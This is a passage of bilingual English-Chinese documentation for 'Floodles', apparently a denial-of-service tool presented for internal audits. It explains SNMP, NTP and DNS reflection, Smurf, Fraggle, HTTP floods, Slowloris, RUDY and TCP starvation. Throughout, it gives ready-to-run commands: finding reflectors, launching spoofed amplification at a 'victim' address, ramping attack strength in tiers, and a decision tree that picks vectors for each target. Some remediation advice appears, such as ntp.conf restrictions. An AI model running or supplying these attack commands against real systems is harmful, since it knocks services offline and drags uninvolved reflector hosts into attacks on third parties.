-> 500:1 leverage from a single host
-> Traffic arrives from legitimate, good-reputation server IPs
-> The reflectors bear the bandwidth cost of the response
```

The attacker's identity is further protected: packets arrive at the victim from the reflectors, not from the attacker. The attacker sends traffic to the reflectors, but those packets have the victim's IP as source — so even the reflectors don't know who the attacker is.
攻击者的身份得到进一步保护：数据包从反射器而不是攻击者到达受害者。攻击者将流量发送到反射器，但这些数据包以受害者的 IP 作为源，因此即使反射器也不知道攻击者是谁。

**Historical scale**: DRDoS attacks have generated the largest DDoS volumes on record. The 2018 GitHub attack used Memcached servers (amplification factor ~51,000x) to deliver 1.35 Tbps sustained at the target. A single attacker with a 30 Mbps uplink could theoretically generate that if enough Memcached reflectors existed. Floodles implements the protocols that remain relevant in modern internal audits.
**Historical scale**：DRDoS 攻击产生了有记录以来最大的 DDoS 量。 2018 年 GitHub 攻击使用 Memcached 服务器（放大系数约 51,000 倍）为目标提供持续的 1.35 Tbps 传输速度。如果存在足够的 Memcached 反射器，理论上具有 30 Mbps 上行链路的单个攻击者就可以生成该攻击。 Floodles 实施的协议在现代内部审计中仍然具有相关性。

---

### 5.2 SNMP Reflection (SNIPER)
### 5.2 SNMP反射（SNIPER）

#### Protocol Background
#### 协议背景

SNMP (Simple Network Management Protocol) is a UDP protocol (port 161) for querying and configuring network equipment. SNMP v1 and v2c authenticate via a **community string** — a plaintext password transmitted in every request. The default community string on virtually all equipment is `public`.
SNMP（简单网络管理协议）是一种用于查询和配置网络设备的UDP协议（端口161）。 SNMP v1 和 v2c 通过 **community string** 进行身份验证 - 每个请求中传输的明文密码。几乎所有设备上的默认社区字符串都是 `public`。

SNMP v2c introduces the **GetBulkRequest**: a single request that asks the agent to return up to `max-repetitions` OID values, traversing a large subtree of the MIB in one response. This is the legitimate equivalent of `snmpwalk`, compressed into one round trip.
SNMP v2c 引入了 **GetBulkRequest**：要求代理返回最多 `max-repetitions` OID 值的单个请求，在一次响应中遍历 MIB 的大型子树。这是 `snmpwalk` 的合法等价物，压缩为一次往返。

#### Amplification Mechanics
#### 放大机制

```
GetBulkRequest payload:
  non-repeaters=0, max-repetitions=255 -> dump entire MIB subtree
  Size: ~60 bytes

GetBulkResponse:
  Agent returns up to 255 rows of OID data
  Typical MIB subtree for .1.3.6.1.2.1: 40-65 KB of data
  Delivered in multiple UDP datagrams (max 65,507 bytes each)
  Amplification factor: ~650x
```

The attack chain with Floodles:
Floodles 的攻击链：

```
1. Attacker identifies a reflector with public community:
   snmpwalk -v2c -c public 192.168.1.50 .1.3.6.1.2.1
   -> Returns MIB data: VULNERABLE

2. Floodles sends UDP datagram:
   IP src  = victim_ip   (spoofed)
   IP dst  = 192.168.1.50
   UDP dst = 161
   Payload = GetBulkRequest, OID=.1.3.6.1.2.1, max-rep=255 (~60 bytes)

3. SNMP agent processes legitimately:
   Dumps MIB subtree -> 40 KB response
   Sends to IP src = victim_ip

4. Victim receives 40 KB per 60-byte query
   With 10 such reflectors in parallel: 1 Mbps out -> 650 Mbps in
```

```bash
# Find open SNMP reflectors on the network
nmap -sU -p 161 --open 192.168.1.0/24
snmpwalk -v2c -c public 192.168.1.50 .1.3.6.1.2.1   # test community string

# Measure actual amplification factor
snmpbulkget -v2c -c public -Cn0 -Cr255 192.168.1.50 .1.3.6.1.2.1 | wc -c
# Divide by ~60 (request size) -> actual factor

# Try common community strings
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.50

# Launch amplification attack
sudo floodles sniper 192.168.1.200 -r 192.168.1.50,192.168.1.51 --community public -t 4 -d 60
```

#### Why SNMP v3 Eliminates This
#### 为什么 SNMP v3 消除了这个问题

SNMPv3 uses per-session authentication (HMAC-SHA or HMAC-MD5) keyed to a shared secret. The response is cryptographically bound to the authenticated session. A spoofed GetBulkRequest without the correct HMAC is rejected. The amplification vector is structurally impossible with v3.
SNMPv3 使用以共享密钥为密钥的每会话身份验证（HMAC-SHA 或 HMAC-MD5）。响应以加密方式绑定到经过身份验证的会话。没有正确 HMAC 的源地址伪造的 GetBulkRequest 将被拒绝。 v3 的扩增向量在结构上是不可能的。

#### Commonly Vulnerable Equipment
#### 常见易受攻击的设备

- Network printers (HP JetDirect, Brother, Xerox): `public` community by default, often internet-facing
- 网络打印机（HP JetDirect、Brother、Xerox）：默认为 `public` 社区，通常面向互联网
- Managed switches: SNMP enabled at deployment and never reconfigured
- 托管交换机：SNMP 在部署时启用并且无需重新配置
- UPS management cards (APC, Eaton, Liebert): factory-default SNMPv2c config
- UPS 管理卡（APC、Eaton、Liebert）：出厂默认 SNMPv2c 配置
- Industrial/SCADA controllers: legacy firmware with no SNMPv3 support
- 工业/SCADA 控制器：不支持 SNMPv3 的旧版固件
- Cisco IOS (pre-2018 configs): `snmp-server community public RO` default
- Cisco IOS（2018 年之前的配置）：`snmp-server community public RO` 默认值

---

### 5.3 NTP Amplification (MONLIST)
### 5.3 NTP 放大（MONLIST）

#### The monlist Command
#### monlist 命令

NTP (Network Time Protocol, RFC 5905) synchronizes clocks over UDP port 123. Like SNMP, it uses UDP — no handshake, source IP trusted by default.
NTP（网络时间协议，RFC 5905）通过 UDP 端口 123 同步时钟。与 SNMP 一样，它使用 UDP — 无握手，默认情况下信任源 IP。

The `monlist` command (NTP private mode 7, request code 42) is a **monitoring feature**: it returns the last 600 IP addresses that queried this NTP server. Each client entry is 44-72 bytes. The full response is fragmented across multiple UDP datagrams.
`monlist` 命令（NTP 专用模式 7，请求代码 42）是 **monitoring feature**：它返回查询此 NTP 服务器的最后 600 个 IP 地址。每个客户端条目为 44-72 字节。完整的响应被分成多个 UDP 数据报。

```
monlist request  : 8 bytes (one UDP packet)
monlist response : up to 600 entries x ~72 bytes = 43,200 bytes
                   Delivered in ~10 UDP datagrams
Amplification    : 43,200 / 8 = ~5,400x (server with 600 cached clients)
```

The factor is state-dependent: a freshly started NTP server with 0 cached clients returns nothing. A production NTP server that has been running for months and has served 600 distinct clients returns the maximum response. This is the reason NTP amplification in the wild could sustain such extreme ratios.
该因素与状态相关：具有 0 个缓存客户端的新启动 NTP 服务器不返回任何内容。已运行数月并为 600 个不同客户端提供服务的生产 NTP 服务器返回最大响应。这就是野外 NTP 扩增能够维持如此极端比率的原因。

The 2014 Cloudflare incident and subsequent US-CERT alert TA14-017A documented NTP monlist as one of the primary amplification vectors of that period, with observed factors up to 4,096:1 on busy reflectors.
2014 年的 Cloudflare 事件和随后的 US-CERT 警报 TA14-017A 将 NTP monlist 记录为该时期的主要放大向量之一，在繁忙的反射器上观察到的因子高达 4,096:1。

```
Attack chain:
  1. Attacker finds NTP server with monlist enabled:
     ntpq -c monlist 192.168.1.1
     -> Client list returned: VULNERABLE

  2. Floodles sends:
     IP src  = victim_ip  (spoofed)
     IP dst  = 192.168.1.1
     UDP dst = 123
     Payload = monlist request (8 bytes)

  3. NTP server looks up its 600-client history, sends full response to victim_ip
     -> victim receives ~43,200 bytes per 8-byte request

  4. With 5 reflectors at 5,000x: 1 Mbps out -> 5 Gbps in
```

```bash
# Probe — does monlist respond? (passive, no attack)
ntpq -c monlist 192.168.1.1
# Client list returned -> vulnerable -> disable monlist immediately
# "No association ID" or timeout -> patched or firewalled

nmap -sU -p 123 --script ntp-monlist 192.168.1.1

# Launch amplification
sudo floodles ntp 192.168.1.200 -r 192.168.1.1,192.168.1.2 -t 4 -d 60
```

#### Vulnerability Status
#### 漏洞状态

CVE-2013-5211. Patched in ntpd 4.2.7p26 (2013): monlist disabled by default. But:
CVE-2013-5211。在 ntpd 4.2.7p26 (2013) 中修补：默认禁用 monlist。但：
- Embedded NTP implementations on switches, printers, and industrial equipment are rarely updated
- 交换机、打印机和工业设备上的嵌入式 NTP 实现很少更新
- Corporate Windows NTP servers (w32tm) never implemented monlist, but some appliances do
- 企业 Windows NTP 服务器 (w32tm) 从未实施 monlist，但某些设备确实实施
- The check remains standard in any internal network audit
- 该检查在任何内部网络审计中仍然是标准的

Remediation:
补救措施：

```bash
# /etc/ntp.conf — disable all mode 7 queries
restrict default noquery nopeer nomodify notrap

# Or upgrade to ntpd >= 4.2.7p26
# Block UDP/123 inbound from internet to internal NTP servers
```

---

### 5.4 DNS Amplification
### 5.4 DNS 放大

#### Two Compounding Conditions
#### 两个复合条件

DNS amplification requires both a **query type that generates large responses** and a **resolver that accepts queries from any source IP**.
DNS 放大需要 **query type that generates large responses** 和 **resolver that accepts queries from any source IP**。

#### Condition 1 — DNSSEC and the ANY Query
#### 条件 1 — DNSSEC 和 ANY 查询

DNS type ANY requests every record the resolver knows for a domain: A, AAAA, MX, NS, SOA, TXT, plus, for DNSSEC-signed zones, DNSKEY records (the zone's public signing keys, 200-400 bytes each) and RRSIG records (cryptographic signatures over each record set).
DNS 类型 ANY 请求解析器知道的域的每条记录：A、AAAA、MX、NS、SOA、TXT，此外，对于 DNSSEC 签名区域、DNSKEY 记录（区域的公共签名密钥，每个 200-400 字节）和 RRSIG 记录（每个记录集的加密签名）。

```
DNS ANY query for a DNSSEC-signed domain: ~40-50 bytes
Full DNSSEC response: 2,000-4,000 bytes
Amplification factor: 40x-100x depending on zone configuration
```

RFC 8482 (2019) recommends resolvers return a minimal HINFO record for ANY queries instead of the full response. Modern **authoritative** servers comply. However, **recursive resolvers** with the full answer cached may still return the complete response — particularly older BIND 9.x or Unbound installations predating 2019.
RFC 8482 (2019) 建议解析器为任何查询返回最小的 HINFO 记录，而不是完整的响应。现代 **authoritative** 服务器符合要求。但是，缓存了完整答案的 **recursive resolvers** 仍可能返回完整响应 - 特别是 2019 年之前的旧版 BIND 9.x 或 Unbound 安装。

#### Condition 2 — Open Resolver
#### 条件 2 — 打开解析器

A DNS resolver is **open** if it answers recursive queries from any source IP. Correct configuration restricts recursion to internal subnets only.
如果 DNS 解析器回答来自任何源 IP 的递归查询，则其为 **open**。正确的配置将递归仅限于内部子网。

```bash
# Test: is this resolver open?
dig @192.168.1.53 isc.org ANY

# Closed (correct):
# ;; ->>HEADER<<- opcode: QUERY, status: REFUSED
# -> Recursion denied for unauthorized source

# Open (misconfigured):
# Full DNSSEC response: 3,200 bytes returned
# -> This server can be used as a reflector
```

Common sources of open resolvers: corporate DNS servers without ACLs, old BIND configurations (`allow-recursion { any; };` was BIND 8's default), misconfigured split-horizon deployments.
开放解析器的常见来源：没有 ACL 的企业 DNS 服务器、旧的 BIND 配置（`allow-recursion { any; };` 是 BIND 8 的默认配置）、配置错误的水平分割部署。

#### Attack Chain
#### 攻击链

```
1. Find open resolver:
   dig @192.168.1.53 isc.org ANY -> DNSSEC response returned

2. Floodles sends:
   IP src  = victim_ip  (spoofed)
   IP dst  = 192.168.1.53
   UDP dst = 53
   Payload = DNS ANY query for isc.org (~44 bytes)

3. Resolver sends 3,200-byte DNSSEC response to victim_ip

4. 50 open resolvers in parallel:
   50 x 3,200B / 44B = 50 x 72x = 3,600x effective factor
   1 Mbps out -> 3.6 Gbps in
```

```bash
# Find open resolvers on the network
nmap -sU -p 53 --script dns-recursion 192.168.1.0/24

# Launch DNS amplification
sudo floodles dns 192.168.1.200 -r 192.168.1.53,192.168.1.54 --qtype ANY -t 4 -d 60

# Use DNSKEY query (maximizes DNSSEC response size)
sudo floodles dns 192.168.1.200 -r 192.168.1.53 --qtype DNSKEY -t 4 -d 60

# Load resolver list from file
sudo floodles dns 192.168.1.200 -r @resolvers.txt --qtype ANY -d 60
```

---

### 5.5 Smurf Attack
### 5.5 蓝精灵攻击

#### Mechanism
#### 机制

Smurf uses ICMP echo requests directed at **broadcast addresses**. When an ICMP echo request is sent to a broadcast address (e.g., `192.168.1.255` for a /24 subnet), every host on that subnet is supposed to reply with an ICMP echo reply.
Smurf 使用针对 **broadcast addresses** 的 ICMP 回显请求。当 ICMP 回显请求发送到广播地址（例如，/24 子网的 `192.168.1.255`）时，该子网上的每个主机都应该回复 ICMP 回显回复。

```
Attacker -> ICMP echo request (src=victim_ip, dst=192.168.1.255)
  -> Every host on 192.168.1.0/24 receives the broadcast
  -> Each host sends an ICMP echo reply to victim_ip

With 120 hosts on the subnet:
  1 request -> 120 replies
  Amplification factor: 120x (network size dependent)
```

Modern routers drop directed broadcasts by default (`no ip directed-broadcast` in Cisco IOS since 12.0). The check in an audit is precisely whether this default was preserved or accidentally overridden.
现代路由器默认丢弃定向广播（自 12.0 起的 Cisco IOS 中的 `no ip directed-broadcast`）。审计中的检查恰恰是此默认值是否被保留或意外被覆盖。

```bash
# Test: does the router forward directed broadcasts?
ping -b 192.168.1.255 -c 3
# Multiple replies -> broadcast forwarding enabled -> Smurf viable

# Launch Smurf
sudo floodles smurf 192.168.1.200 -b 192.168.1.255 -t 4 -d 30

# On /24 with many active hosts
sudo floodles smurf 192.168.1.200 -b 192.168.1.0/24 -d 60
```

---

### 5.6 Fraggle Attack
### 5.6 Fraggle 攻击

#### Mechanism
#### 机制

Fraggle is the UDP equivalent of Smurf. It sends spoofed UDP packets to the **broadcast address** on two echo service ports:
Fraggle 是 Smurf 的 UDP 等价物。它通过两个回显服务端口将源地址伪造的 UDP 数据包发送到 **broadcast address**：

- **Port 7 (Echo)**: the server sends back whatever it received — a direct echo. One 64-byte request generates one 64-byte reply from each host. Factor = number of hosts with Echo service enabled.
- **Port 7 (Echo)**：服务器发回收到的任何内容 - 直接回显。一个 64 字节请求会从每个主机生成一个 64 字节回复。 Factor = 启用 Echo 服务的主机数量。
- **Port 19 (Chargen)**: the server generates a continuous stream of arbitrary characters. One request can trigger multiple responses, increasing the amplification factor beyond 1x per host.
- **Port 19 (Chargen)**：服务器生成任意字符的连续流。一个请求可以触发多个响应，从而将每个主机的放大系数提高到 1 倍以上。

Echo and Chargen services are disabled by default on all modern OS. Their presence indicates a legacy host or a misconfigured service (common on older network equipment with `service tcp-small-servers` or `service udp-small-servers` on Cisco IOS pre-12.0).
默认情况下，所有现代操作系统上都禁用 Echo 和 Chargen 服务。它们的存在表明旧主机或服务配置错误（在 Cisco IOS 12.0 之前版本上具有 `service tcp-small-servers` 或 `service udp-small-servers` 的旧网络设备上很常见）。

```bash
# Test Echo service (port 7)
echo "test" | nc -u 192.168.1.50 7 -w 1
# "test" echoed back -> Echo service running -> Fraggle viable

# Launch Fraggle
sudo floodles fraggle 192.168.1.200 -b 192.168.1.255 --port 7 -d 30
sudo floodles fraggle 192.168.1.200 -b 192.168.1.255 --port 19 -d 30
```

---

### 5.7 Multi-Vector (SPRAY)
### 5.7 多向量（喷雾）

SPRAY launches multiple amplification vectors simultaneously from a single YAML configuration, correlating their traffic toward a single victim. This matches real-world attack patterns: single-vector DDoS is trivial to identify and filter; simultaneous SNMP + NTP + DNS + Smurf from different source classes stresses mitigation systems that must apply different rules per protocol.
SPRAY 从单个 YAML 配置同时启动多个放大向量，将其流量与单个受害者相关联。这符合现实世界的攻击模式：单向量 DDoS 很容易识别和过滤；来自不同源类的同时 SNMP + NTP + DNS + Smurf 给缓解系统带来压力，要求每个协议必须应用不同的规则。

```yaml
# config/examples/spray.yaml
victim: 192.168.1.200
vectors:
  - type: snmp
    reflectors: [192.168.1.50, 192.168.1.51]
    community: public
    threads: 4
  - type: ntp
    reflectors: [192.168.1.1]
    threads: 2
  - type: dns
    reflectors: [192.168.1.53]
    qtype: ANY
    threads: 2
duration: 120
```

```bash
sudo floodles spray 192.168.1.200 -c config/examples/spray.yaml -d 120
```

---

## 6. Layer 7 Modules — Application
## 6. Layer 7 模块——应用

### 6.1 HTTP Flood (LOIC L7)
### 6.1 HTTP 泛洪（LOIC L7）

#### Detailed Mechanism
#### 详细机制

An HTTP flood sends legitimate-looking HTTP requests as fast as possible. Unlike L3/L4 floods, the TCP handshake completes — each request is a real connection that reaches the application. The application must process the request: parse headers, query a database, render a template, call downstream APIs, and write a response.
HTTP 泛洪会尽快发送看似合法的 HTTP 请求。与 L3/L4 泛洪不同，TCP 握手完成 - 每个请求都是到达应用程序的真实连接。应用程序必须处理请求：解析标头、查询数据库、呈现模板、调用下游 API 并编写响应。

A single HTTP request that queries a database can consume 10-100 ms of CPU time and multiple disk I/Os. At 10,000 RPS, a server with 100ms per-request processing time needs 1,000 CPU cores to sustain the load. Obviously it doesn't have them.
查询数据库的单个 HTTP 请求可能会消耗 10-100 毫秒的 CPU 时间和多个磁盘 I/O。在 10,000 RPS 下，每个请求处理时间为 100 毫秒的服务器需要 1,000 个 CPU 核心来维持负载。显然它没有它们。

#### The Go Engine
#### Go 引擎

Floodles uses `native/go/engine.go` for HTTP flooding. Each goroutine maintains a persistent HTTP connection pool (Go's `net/http` client reuses TCP connections by default via `Connection: keep-alive`). This means the flood generates HTTP requests, not TCP connections — the L4 overhead is amortized.
Floodles 使用 `native/go/engine.go` 进行 HTTP 泛洪。每个 goroutine 维护一个持久的 HTTP 连接池（Go 的 `net/http` 客户端默认通过 `Connection: keep-alive` 重用 TCP 连接）。这意味着泛洪会生成 HTTP 请求，而不是 TCP 连接 — L4 开销已摊销。

The engine rotates User-Agent strings (Chrome, Firefox, Safari, mobile, curl) and optionally adds cache-busting query parameters (`?_=<random>`) to prevent CDN caching from absorbing the load:
该引擎会轮换用户代理字符串（Chrome、Firefox、Safari、mobile、curl），并可选择添加缓存破坏查询参数 (`?_=<random>`)，以防止 CDN 缓存吸收负载：

```bash
# Basic HTTP flood
floodles http http://192.168.1.100/ -c 2000 -d 60

# POST flood with body (stresses request parsing and upload handling)
floodles http http://192.168.1.100/api/submit -m POST --post-size 4096 -c 1000 -d 60

# Cache-busting (default: enabled — disable with --no-bust for cached endpoint tests)
floodles http http://192.168.1.100/search?q=test -c 2000 -d 60

# HTTPS (TLS handshake adds CPU cost on the server side)
floodles http https://192.168.1.100/ -c 2000 -d 60
```

---

### 6.2 Slowloris (LORIS)
### 6.2 Slowloris (LORIS)

#### Detailed Mechanism
#### 详细机制

Slowloris (RSnake, 2009) does not flood. It **starves** the web server of connection slots. Most HTTP servers maintain a fixed pool of worker threads or processes (e.g., Apache prefork: default 150 workers). Each worker blocks while handling a request. Slowloris sends HTTP requests that are intentionally incomplete:
Slowloris（RSnake，2009）不是靠大流量泛洪，而是**耗尽** Web 服务器的连接槽。大多数 HTTP 服务器维护固定规模的工作线程或进程池（例如 Apache prefork 默认 150 个 worker）。每个 worker 在处理请求时会阻塞。Slowloris 会发送故意不完整的 HTTP 请求：

```
Slowloris connection lifecycle:
  1. TCP handshake (completes normally)
  2. Send partial HTTP request:
     "GET / HTTP/1.1\r\n"
     "Host: target.com\r\n"
     "X-Timeout: " (incomplete — header has no value, no \r\n)
  3. Every 15 seconds, send one more header byte to keep the connection alive:
     "a"
     "b"
     ...
  4. Server's worker thread blocks waiting for the request to complete
  5. Repeat with 500 concurrent connections
  -> 500 workers blocked -> server's thread pool exhausted
  -> Legitimate requests queue forever -> effective DoS
```

The server cannot distinguish this from a legitimate slow client (mobile on 2G, congested network). The attack uses no significant bandwidth — it is entirely about occupying server thread resources.
服务器无法将其与合法的慢客户端（2G 移动、网络拥塞）区分开来。该攻击不使用大量带宽——它完全是占用服务器线程资源。

**nginx is resistant** by design: it uses non-blocking I/O (event-driven architecture). A slow connection does not block a worker — it simply waits in the event queue. nginx can handle thousands of slow connections without degradation.
**nginx 天生具备抗性**：它使用非阻塞 I/O（事件驱动架构）。慢速连接不会阻塞 worker，只是在事件队列中等待。nginx 可以处理数千个慢速连接而性能不明显下降。

**Apache prefork and worker MPM are vulnerable** (without additional configuration like `RequestReadTimeout`).
**Apache prefork 和 worker MPM 容易受到影响**（除非配置了 `RequestReadTimeout` 等额外保护）。

```bash
# Slowloris against Apache (vulnerable by default)
floodles slow target.com -p 80 -s 500 -i 15 -d 120

# HTTPS variant (TLS adds server-side CPU for each socket)
floodles slow target.com -p 443 -s 300 --ssl -d 120

# Verify impact — from another host:
curl --connect-timeout 5 http://target.com/
# -> connection timed out: attack effective
```

---

### 6.3 Slow POST (RUDY)
### 6.3 慢速 POST (RUDY)

#### Detailed Mechanism
#### 详细机制

RUDY (R-U-Dead-Yet?) is the POST equivalent of Slowloris. A legitimate POST request announces its body size in the `Content-Length` header, then streams the body. RUDY announces a large `Content-Length` (e.g., 10 MB) and sends the body at 1 byte every 10-15 seconds.
RUDY（R-U-Dead-Yet？）相当于 Slowloris 的 POST。合法的 POST 请求在 `Content-Length` 标头中声明其正文大小，然后传输正文。 RUDY 宣布一个大的 `Content-Length` （例如，10 MB）并每 10-15 秒以 1 个字节发送正文。

```
RUDY connection:
  POST /upload HTTP/1.1
  Host: target.com
  Content-Length: 10485760   <- claims 10 MB body
  Content-Type: application/x-www-form-urlencoded

  [waits 15 seconds]
  a
  [waits 15 seconds]
  b
  ...

Server's worker thread is blocked receiving the body.
At 500 concurrent connections: 500 threads blocked for the duration.
```

The server cannot close the connection — it committed to receiving the POST body. The attack is fully RFC-compliant. Without application-level rate limiting (minimum upload rate, per-IP connection limits, body timeout), the server has no legitimate way to distinguish RUDY from a client with a very slow upload connection.
服务器无法关闭连接——它承诺接收 POST 正文。该攻击完全符合 RFC 标准。如果没有应用程序级别的速率限制（最低上传速率、每个 IP 连接限制、主体超时），服务器就没有合法的方法来区分 RUDY 和上传连接速度非常慢的客户端。

```bash
floodles slowpost target.com -p 80 -s 200 --cl 10485760 -i 15 -d 180
```

---

### 6.4 TCP Starvation (NUKE)
### 6.4 TCP 饥饿（NUKE）

#### Mechanism Variants
#### 机制变体

NUKE exhausts the server's TCP connection table rather than its application threads. Three variants target different states:
NUKE 耗尽服务器的 TCP 连接表而不是其应用程序线程。三种变体针对不同的状态：

**`hold`** — Completes the TCP handshake, then sends no data. The server's connection is `ESTABLISHED` waiting for an HTTP request. Connection tables have a maximum size. With enough sockets held open:
**`hold`** — 完成 TCP 握手，然后不发送数据。服务器端连接处于 `ESTABLISHED` 状态，等待 HTTP 请求。连接表有容量上限；只要保持足够多的套接字打开：

```
netstat -an | grep ESTABLISHED | wc -l
# Rising toward net.core.somaxconn or application limit
```

**`window0`** — Sends TCP window size of 0 after connecting. The server has data to send (HTTP response) but the client's receive window is full. The server must maintain the connection and retransmit when the window opens. It never opens. The server is stuck with an established connection consuming a table slot and memory, waiting indefinitely.
**`window0`** — 连接后发送 TCP 窗口大小为 0 的报文。服务器有数据要发送（HTTP 响应），但客户端接收窗口已满。服务器必须保持连接，并在窗口重新打开时重传；但窗口永远不会打开。服务器因此被一个已建立连接拖住，持续消耗连接表槽位和内存。

**`persist`** — Sends TCP keepalive frames to prevent the server's idle timeout from closing the connection, maintaining it in a zombie state.
**`persist`** — 发送 TCP keepalive 帧，阻止服务器因空闲超时关闭连接，使连接长期维持在僵尸状态。

```bash
# Hold connections open (simplest)
floodles nuke target.com -p 80 -s 500 --variant hold -d 120

# Window-zero stall (server holds state waiting to send)
floodles nuke target.com -p 80 -s 300 --variant window0 -d 180

# Persistent keepalive zombie
floodles nuke target.com -p 80 -s 200 --variant persist -i 30 -d 300
```

---

## 7. Tuning Attack Power — Practical Guide
## 7. 调整攻击强度——实用指南

### 7.1 General Principle
### 7.1 一般原则

Never start at maximum load. Use a tiered approach that gives you observable data at each step:
切勿以最大负载启动。使用分层方法，在每个步骤中为您提供可观察的数据：

```
Tier 1 — Probe (5-10% of estimated max)
  -> Verify the module works, establish a baseline
  -> Does the target notice? Does the IDS alert?

Tier 2 — Pressure (20-30%)
  -> Observe latency increase, partial degradation
  -> At what PPS does response time double?

Tier 3 — Saturation Threshold (60-80%)
  -> Find the degradation cliff — the point of meaningful service impact
  -> Document the exact PPS/concurrency value

Tier 4 — Full Load
  -> Confirm the protection mechanism's actual ceiling
  -> Measure recovery time after stopping
```

### 7.2 Key Parameters
### 7.2 关键参数

```bash
# -t / --threads: worker threads (L3/L4 only)
# -d / --duration: test duration in seconds (0 = run until Ctrl+C)
# --pps: cap packets per second (0 = unlimited)
# -c / --concurrency: concurrent connections (L7 only)
# -s / --sockets: concurrent sockets (Slowloris / RUDY / NUKE)
# --no-spoof: disable IP spoofing (use your real source IP)
# --no-log: disable JSONL logging

# Progressive SYN flood example:
sudo floodles syn 192.168.1.100 80 -t 2 --pps 5000  -d 30   # tier 1
sudo floodles syn 192.168.1.100 80 -t 4 --pps 30000 -d 60   # tier 2
sudo floodles syn 192.168.1.100 80 -t 8 --pps 100000 -d 60  # tier 3
sudo floodles syn 192.168.1.100 80 -t 16 -d 60              # tier 4
```

### 7.3 Monitoring Your Own Link
### 7.3 监控您自己的链接

An intensive flood can saturate your own sender's network interface before it saturates the target:
密集的泛洪可以在使目标饱和之前使您自己的发送者的网络接口饱和：

```bash
# Monitor your uplink during the attack
watch -n1 'ip -s link show eth0'
# TX packets and TX bytes rising -> you are consuming bandwidth

# If your pings to external hosts increase -> your link is saturating
ping -i 0.1 8.8.8.8
# Latency spike -> reduce --pps or thread count
```

### 7.4 Observing the Target
### 7.4 观察目标

```bash
# TCP connection state (on the target, if you have access)
watch -n1 'ss -s'
# SYN-RECV rising -> SYN queue filling
# ESTABLISHED count rising -> connection table filling
# TIME-WAIT rising -> post-attack cleanup load

# HTTP service availability (from an unaffected host)
watch -n2 'curl -o /dev/null -s -w "%{http_code} %{time_total}s\n" http://192.168.1.100/'
# 200 1.2s -> degraded but responding
# 000 -> unreachable
```

---

## 8. Audit Methodology
## 8. 审计方法

### 8.1 Full Workflow
### 8.1 完整工作流程

```
Phase 1: RECON
  floodles scan <target> --ntp
  -> Open ports and services
  -> OS and server version fingerprint
  -> NTP monlist probe
  -> SNMP community probe
  -> DNS recursion check

Phase 2: BASELINE
  -> Measure normal HTTP latency and throughput
  -> Document reference connection table size
  -> Ping baseline (RTT and loss)
  -> Application response time under zero load

Phase 3: TESTING (increasing severity)
  -> Detection tests: XMAS -> IDS alerts?
  -> Bypass tests: ACK flood -> stateful firewall?
  -> Resistance tests: SYN flood -> SYN cookies active?
  -> Application tests: Slowloris -> Apache unprotected?
  -> Amplification audit: SNMP/NTP/DNS open reflectors?

Phase 4: DOCUMENTATION
  -> Degradation threshold per vector
  -> Protection mechanisms: active / ineffective / absent
  -> Remediation recommendation per finding
  -> JSONL logs as evidence appendix
```

### 8.2 Decision Tree
### 8.2 决策树

```
floodles scan <target> --ntp
    |
    +-- Port 80/443 open?
    |   +-- Apache/IIS detected -> slowloris + slowpost + nuke
    |   +-- nginx               -> http_flood (resists Slowloris natively)
    |   +-- WAF/CDN in front    -> http_flood POST, cache_bust=true
    |
    +-- Any TCP port open?
    |   +-- Check SYN cookies   -> if disabled: syn_flood
    |   +-- Firewall present    -> ack_flood (stateful?)
    |   +-- IDS in scope        -> xmas_flood (detects?)
    |   +-- Long-lived sessions -> rst_flood
    |
    +-- UDP services?
    |   +-- DNS port 53         -> udp_flood + dns amplification test
    |   +-- NTP port 123        -> ntp monlist probe + ntp_amp
    |
    +-- Amplifiers in scope?
    |   +-- SNMP community public -> sniper (~650x)
    |   +-- NTP monlist           -> ntp_amp (~5,000x)
    |   +-- DNS open resolver     -> dns_amp (~70x)
    |   +-- Active broadcast /24  -> smurf + fraggle
    |   +-- Multiple present      -> spray (multi-vector)
    |
    +-- Legacy/OT/embedded equipment?
        +-- Old kernel (<2.0.32) -> overlap (teardrop)
        +-- Reassembly buffers   -> frag (last_only)
        +-- Echo/Chargen UDP     -> fraggle
```

### 8.3 What to Document Per Finding
### 8.3 根据发现记录什么

For each test:
对于每个测试：
1. **Vector used** and parameters (`floodles syn 192.168.1.100 80 -t 8 --pps 100000 -d 60`)
1. **Vector used** 和参数 (`floodles syn 192.168.1.100 80 -t 8 --pps 100000 -d 60`)
2. **Expected result** if protection is correctly configured
2. **Expected result** 如果保护配置正确
3. **Observed result** (degradation, unreachability, log entry)
3. **Observed result**（降级、无法访问、日志条目）
4. **Threshold** (at what PPS / concurrency does impact begin)
4. **Threshold**（影响开始时的 PPS/并发数）
5. **Recovery time** after stopping the flood
5. 泛洪停止后**Recovery time**
6. **Remediation recommendation**

---

## 9. Installation and Build
## 9. 安装和构建

### 9.0 Quick Install
### 9.0 快速安装

Two paths depending on whether you want pre-built binaries or to compile from source.
两个路径取决于您是否需要预构建的二进制文件或从源代码编译。

#### Option A — Release tarball (no compiler required)
#### 选项 A — 发布 tarball（无需编译器）

Download the pre-built tarball from the [Releases](https://github.com/franckferman/Floodles/releases) page. It contains the Python source tree and pre-compiled native backends (`libsender.so`, `libfloodles_packets.so`, `floodles-engine`) for Linux x86_64.
从 [发布](https://github.com/franckferman/Floodles/releases) 页面下载预构建的 tarball。它包含适用于 Linux x86_64 的 Python 源代码树和预编译的原生后端（`libsender.so`、`libfloodles_packets.so`、`floodles-engine`）。

```bash
tar -xzf floodles-vX.Y.Z-linux-x86_64.tar.gz
cd floodles-vX.Y.Z-linux-x86_64

./install.sh        # detects pre-built binaries, skips make / Rust / Go install
source ~/.bashrc    # or source ~/.zshrc
```

`install.sh` checks for the three native binaries before invoking `make`. If all three exist, it skips the Rust/Go toolchain installation and the build step entirely — only `gcc`, Python 3, and `python3-venv` are required.
`install.sh` 在调用 `make` 之前检查三个本机二进制文件。如果这三个都存在，它将完全跳过 Rust/Go 工具链安装和构建步骤 - 仅需要 `gcc`、Python 3 和 `python3-venv`。

#### Option B — Git clone (builds from source)
#### 选项 B — Git 克隆（从源代码构建）

`install.sh` handles everything: system packages, Rust via rustup, Go if missing, Python venv, `pip install -e .`, `make` for all three backends, alias injection.
`install.sh` 处理一切：系统包、通过 rustup 实现 Rust、Go（如果丢失）、Python venv、`pip install -e .`、`make`（用于所有三个后端）、别名注入。

```bash
git clone https://github.com/franckferman/Floodles.git
cd Floodles
chmod +x install.sh
./install.sh
source ~/.bashrc   # or source ~/.zshrc
```

After install, run `floodles detect` to verify all backends loaded. The sections below document each step individually for environments where the script cannot run.
安装后，运行 `floodles detect` 以验证所有后端已加载。以下部分针对脚本无法运行的环境单独记录了每个步骤。

---
